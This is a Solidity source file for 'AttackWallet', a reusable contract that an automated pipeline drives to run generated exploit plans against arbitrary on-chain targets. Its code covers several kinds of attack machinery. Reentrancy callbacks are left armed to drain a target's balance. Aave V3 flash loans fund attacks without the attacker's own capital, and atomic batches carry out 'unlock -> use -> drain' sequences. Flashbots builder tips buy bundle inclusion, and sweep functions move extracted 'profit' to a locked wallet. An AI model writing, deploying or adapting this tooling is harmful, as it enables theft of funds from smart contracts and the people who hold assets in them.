// SPDX-License-Identifier: UNLICENSED
// Author: DanyTech
pragma solidity ^0.8.19;

/// Generic, reusable on-chain exploit-execution primitive.
///
/// Deployed ONCE per wallet and reused forever afterwards for every future
/// exploit, against any target, of any bug type -- the automated pipeline
/// (onchain_scripts/auto_pipeline.py) drives it entirely from off-chain by
/// replaying the ordered (target, calldata, value) steps a generated
/// exploit plan describes, instead of generating, compiling, and
/// deploying a bespoke Solidity contract for every single exploit.
///
/// This deliberately avoids a delegatecall/proxy-style "swap the logic
/// underneath a stable address" design: that would require every one of
/// this project's existing exploit templates to be rewritten so their
/// storage layout is proxy-compatible, for a payoff (gas saved by not
/// redeploying a small contract) that is already negligible on L2s and
/// testnets. Instead, the SAME already-deployed contract is just told
/// what to call next -- there is no "logic" to swap at all.
///
/// Reentrancy-style exploits need the attacker's own address to receive
/// a mid-attack callback. `armCallback`/`receive()` cover that: the owner
/// arms "what to call the next time ETH arrives here" before triggering
/// the vulnerable call, and every subsequent incoming transfer re-runs it
/// (deliberately NOT auto-disarmed -- a real reentrancy loop fires this
/// repeatedly until the target's own balance is exhausted, same as the
/// existing bespoke `receive()`-based exploit templates already do).
///
/// `startFlashLoan`/`executeOperation` cover the Aave V3 case the exact
/// same way: a bug the fuzzer finds assuming "infinite balance" during its
/// own simulation can be reproduced for real with zero attacker capital
/// (beyond the flash premium) by borrowing from a real Aave V3 pool
/// instead of needing the attacker to actually hold that capital. Aave
/// calls back into `executeOperation` mid-loan; the owner arms what that
/// callback should do (normally: call the vulnerable target with the
/// borrowed funds) the same way `armCallback` arms a reentrancy callback.
/// Aave itself pulls the repayment via `approve` right after -- if that
/// fails, Aave's own Pool reverts the whole transaction, so a successful
/// `startFlashLoan` call is itself proof repayment held.
contract AttackWallet {
    address public owner;
    address public pendingCallbackTarget;
    bytes public pendingCallback;

    struct Step {
        address target;
        bytes data;
        // Added 2026-11-02: without this, a flashloan-armed step could
        // never forward ETH -- `execute()` (used by the plain
        // register->fund->fuzz->exploit path) has always taken a `value`
        // argument, but this struct didn't, so the ONE place a borrowed
        // asset gets unwrapped into real native currency (WETH9-style
        // `withdraw(uint256)` inside executeOperation, see
        // onchain_scripts/auto_pipeline.py) had no way to hand that ETH
        // on to the actual vulnerable call that needs it as msg.value.
        uint256 value;
    }

    address public pendingFlashloanPool;
    Step[] public pendingFlashloanSteps;

    // Where every sweep (ETH, builder-tip remainder, or token) is sent --
    // set ONCE via setSafeWallet, then locked forever. This is the actual
    // safety boundary: `owner` can rotate (transferOwnership, e.g. handing
    // this wallet to whichever key the next automated run authenticates
    // as), but a rotated or outright COMPROMISED owner key still can't
    // redirect a single wei of swept profit anywhere except this address
    // -- every sweep function below takes no destination argument at all
    // anymore, specifically so there is no calldata that could ever name
    // a different one. Changing where profit goes means deploying a new
    // AttackWallet, never calling anything on this one.
    address public safeWallet;

    event Executed(address indexed target, uint256 value, bool success);
    event CallbackFired(address indexed target, bool success);
    event SlotWarmed(address pendingCallbackTarget);
    event FlashloanActionFired(address indexed target, bool success);
    event SafeWalletLocked(address indexed safeWallet);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "AttackWallet: not owner");
        _;
    }

    /// One-time lock-in, callable exactly once (by design: there is no
    /// way to call this again after safeWallet is non-zero, not even by
    /// the owner) -- onchain_scripts/auto_pipeline.py calls this
    /// immediately after deploying a fresh instance, and separately
    /// REFUSES to reuse an existing instance whose locked-in safeWallet
    /// doesn't match what that run expects (see get_or_deploy_attack_wallet),
    /// rather than silently proceeding with the wrong one.
    function setSafeWallet(address wallet) external onlyOwner {
        require(safeWallet == address(0), "AttackWallet: safe wallet already locked");
        require(wallet != address(0), "AttackWallet: zero wallet");
        safeWallet = wallet;
        emit SafeWalletLocked(wallet);
    }

    /// Make an arbitrary call as this contract's own identity. This is the
    /// one building block every exploit step is expressed as.
    ///
    /// W1: a step whose inner call FAILS now REVERTS this transaction
    /// (bubbling the callee's own revert reason) instead of returning
    /// `success=false`. Previously the failure was silent: the outer
    /// `execute()` still succeeded, so the pipeline saw `receipt.status==1`
    /// and reported "every step succeeded, NO PROFIT" even though a middle
    /// step had reverted and every later step then ran against state the
    /// failed step never produced. This matches `executeOperation`'s own
    /// behaviour (see its `if (!ok) revert(...)`), so both execution paths
    /// now agree: a reverted step is a reverted plan, with the real reason
    /// visible on-chain.
    function execute(address target, bytes calldata data, uint256 value)
        external
        payable
        onlyOwner
        returns (bool success, bytes memory ret)
    {
        (success, ret) = target.call{value: value}(data);
        emit Executed(target, value, success);
        if (!success) {
            _bubbleRevert(ret, "AttackWallet: execute target call reverted with no reason");
        }
    }

    /// W2: run an ordered (target, data, value) sequence ATOMICALLY, in one
    /// transaction, as this contract's own identity. Unlike the Python
    /// pipeline's one-transaction-per-step replay (each step its own send,
    /// with a real block boundary and a front-running window between them),
    /// this keeps the whole sequence in a single transaction -- the shape a
    /// real compound exploit needs (unlock -> use -> drain) and the same
    /// atomicity the Aave `executeOperation` path already gives borrowed
    /// funds. Every step must succeed; a failure reverts the WHOLE batch, so
    /// a partial sequence can never be left half-applied on-chain.
    function executeBatch(address[] calldata targets, bytes[] calldata datas, uint256[] calldata values)
        external
        payable
        onlyOwner
    {
        require(
            targets.length == datas.length && targets.length == values.length,
            "AttackWallet: length mismatch"
        );
        for (uint256 i = 0; i < targets.length; i++) {
            (bool ok, bytes memory ret) = targets[i].call{value: values[i]}(datas[i]);
            emit Executed(targets[i], values[i], ok);
            if (!ok) {
                _bubbleRevert(ret, "AttackWallet: batch step reverted with no reason");
            }
        }
    }

    /// Revert with the callee's own reason when it provided one, else with
    /// `fallbackMsg`. Shared by execute()/executeBatch()/executeOperation()
    /// so a failed step is always diagnosable from the transaction trace.
    function _bubbleRevert(bytes memory ret, string memory fallbackMsg) internal pure {
        if (ret.length > 0) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
        revert(fallbackMsg);
    }

    /// Arm "call this (target, data) the next time ETH arrives" -- used
    /// right before triggering a call that is expected to reenter this
    /// contract mid-execution.
    function armCallback(address target, bytes calldata data) external onlyOwner {
        pendingCallbackTarget = target;
        pendingCallback = data;
    }

    function disarmCallback() external onlyOwner {
        pendingCallbackTarget = address(0);
        pendingCallback = "";
    }

    receive() external payable {
        if (pendingCallbackTarget != address(0)) {
            // Intentionally not cleared here -- see contract-level doc.
            (bool ok, ) = pendingCallbackTarget.call(pendingCallback);
            emit CallbackFired(pendingCallbackTarget, ok);
        }
    }

    /// Arm the ordered sequence of (target, data, value) calls to run, in
    /// order, once the Aave flashloan arrives -- used right before
    /// `startFlashLoan`. A real exploit usually needs more than one call
    /// (unwrap the borrowed asset into native currency via its own
    /// `withdraw(uint256)`, trigger the vulnerable contract with that ETH
    /// as msg.value, wrap enough of the proceeds back for repayment),
    /// unlike a plain reentrancy callback.
    function armFlashloanActions(address[] calldata targets, bytes[] calldata datas, uint256[] calldata values) external onlyOwner {
        require(targets.length == datas.length && targets.length == values.length, "AttackWallet: length mismatch");
        delete pendingFlashloanSteps;
        for (uint256 i = 0; i < targets.length; i++) {
            pendingFlashloanSteps.push(Step(targets[i], datas[i], values[i]));
        }
    }

    function disarmFlashloanActions() external onlyOwner {
        delete pendingFlashloanSteps;
    }

    /// Borrows `amount` of `asset` from a real Aave V3 pool via
    /// flashLoanSimple -- this one call's success proves the whole
    /// borrow -> armed action -> repay sequence held together for real.
    function startFlashLoan(address pool, address asset, uint256 amount, bytes calldata params) external onlyOwner {
        pendingFlashloanPool = pool;
        (bool ok, ) = pool.call(
            abi.encodeWithSelector(0x42b0b77c, address(this), asset, amount, params, uint16(0))
        ); // flashLoanSimple(address,address,uint256,bytes,uint16)
        require(ok, "AttackWallet: flashLoanSimple failed");
    }

    /// Aave V3's callback mid-flashLoanSimple. msg.sender must be the
    /// exact pool this contract itself just borrowed from (never trust an
    /// unsolicited caller claiming to be a pool), and the owner must have
    /// armed an action -- otherwise this isn't a loan we started.
    function executeOperation(address asset, uint256 amount, uint256 premium, address /* initiator */, bytes calldata /* params */)
        external
        returns (bool)
    {
        require(msg.sender == pendingFlashloanPool, "AttackWallet: not the pool we borrowed from");
        // Pre-warm pendingCallbackTarget's storage slot (EIP-2929: a
        // COLD SLOAD alone costs 2100 gas) before any step below can
        // trigger this contract's own receive() under a gas-limited
        // send. WETH9's withdraw() -- used by the WETH-unwrap funding
        // path in onchain_scripts/auto_pipeline.py's
        // execute_flat_plan_via_flashloan -- hardcodes
        // msg.sender.transfer() (a fixed 2300 gas stipend) to pay out,
        // and receive()'s own first line reads this exact slot.
        // Confirmed live on a local Anvil fork of real ETH mainnet state
        // (2026-11-02): without this line, that withdraw() call's
        // forwarded 2300 gas ran out mid-SLOAD, reverting with
        // "EvmError: OutOfGas" inside receive() -- not a rare edge case,
        // a GUARANTEED failure on every single flashloan-funded plan.
        // emit (not a bare read) because an unused read has no
        // observable effect and could be optimized away entirely under
        // --via-ir; a logged event's argument is not. The warmed read
        // costs ~100 gas on its real use inside receive(), comfortably
        // inside the 2300 stipend.
        emit SlotWarmed(pendingCallbackTarget);
        uint256 steps = pendingFlashloanSteps.length;
        for (uint256 i = 0; i < steps; i++) {
            Step memory step = pendingFlashloanSteps[i];
            (bool ok, bytes memory ret) = step.target.call{value: step.value}(step.data);
            emit FlashloanActionFired(step.target, ok);
            // A failed step is bubbled (shared `_bubbleRevert` helper) rather
            // than silently skipped: for a sequence where EVERY step feeds
            // the next one's real on-chain state (e.g. transfer-then-swap
            // arbitrage legs, not independent exploit probes), a silently-
            // skipped early step produces a confusing LATER failure instead
            // of pointing at the real one.
            if (!ok) {
                _bubbleRevert(ret, "AttackWallet: flashloan step reverted with no reason");
            }
        }
        // approve(address,uint256) -- Aave pulls amount+premium right after this returns.
        (bool approved, ) = asset.call(abi.encodeWithSelector(0x095ea7b3, msg.sender, amount + premium));
        require(approved, "AttackWallet: approve for repayment failed");
        return true;
    }

    /// W3: send native currency with a full gas-forwarding `call` instead of
    /// `.transfer()`. `.transfer()` forwards only 2300 gas, which a CONTRACT
    /// recipient (a Gnosis Safe / multisig recovery wallet, a treasury, any
    /// receive() that writes storage or emits) cannot run within -- the send
    /// then reverts and the swept profit is stuck in this contract. `call`
    /// forwards all remaining gas and the recipient's own revert (if any) is
    /// surfaced here rather than swallowed. Reentrancy is not a concern for
    /// these payout paths: they are `onlyOwner`, send to a fixed locked
    /// address, and zero this contract's balance before/while sending.
    function _safeSend(address to, uint256 amount) internal {
        if (amount == 0) {
            return;
        }
        (bool ok, bytes memory ret) = payable(to).call{value: amount}("");
        if (!ok) {
            _bubbleRevert(ret, "AttackWallet: native send failed");
        }
    }

    /// Send every bit of ETH this contract holds to the locked-in
    /// safeWallet -- no destination argument, on purpose (see safeWallet's
    /// own doc comment above).
    function sweep() external onlyOwner {
        require(safeWallet != address(0), "AttackWallet: safe wallet not set");
        uint256 bal = address(this).balance;
        if (bal > 0) {
            _safeSend(safeWallet, bal);
        }
    }

    uint256 public constant MAX_BUILDER_TIP_BPS = 1000; // 10% hard cap, regardless of what's passed in

    /// Pays the CURRENT block's builder (`block.coinbase`) a fraction of
    /// this contract's REAL on-chain balance at the moment this executes,
    /// then sweeps the rest to `to` -- both computed atomically from the
    /// real resulting balance after every prior step in the same
    /// transaction/bundle, never from an off-chain guess at expected
    /// profit. This is the standard way a Flashbots bundle pays for its
    /// own inclusion: a builder deciding whether to include this exact
    /// bundle sees the real payment by simulating it first (eth_callBundle)
    /// -- an off-chain priority-fee bump has to guess the profit in
    /// advance to size itself correctly (see onchain_scripts/
    /// auto_pipeline.py's own history: an earlier, since-removed attempt
    /// based its percentage on the plan's total_value -- the value AT
    /// RISK across the exploit's steps, not the actual profit -- which
    /// could tip away far more than was ever extracted). Reading the real
    /// balance here needs no guessing at all.
    function sweepWithBuilderTip(uint256 tipBps) external onlyOwner {
        require(tipBps <= MAX_BUILDER_TIP_BPS, "AttackWallet: tip too large");
        require(safeWallet != address(0), "AttackWallet: safe wallet not set");
        uint256 bal = address(this).balance;
        if (bal == 0) {
            return;
        }
        uint256 tip = (bal * tipBps) / 10000;
        if (tip > 0) {
            _safeSend(block.coinbase, tip);
        }
        uint256 remainder = address(this).balance;
        if (remainder > 0) {
            _safeSend(safeWallet, remainder);
        }
    }

    /// Same no-destination-argument safety boundary as sweep()/
    /// sweepWithBuilderTip() above, for a token balance instead of ETH.
    function sweepToken(address token, uint256 amount) external onlyOwner {
        require(safeWallet != address(0), "AttackWallet: safe wallet not set");
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(0xa9059cbb, safeWallet, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "AttackWallet: token sweep failed");
    }

    /// Transfer control to a new owner -- e.g. handing this wallet off to
    /// whichever key the next automated run authenticates as.
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "AttackWallet: zero owner");
        owner = newOwner;
    }
}
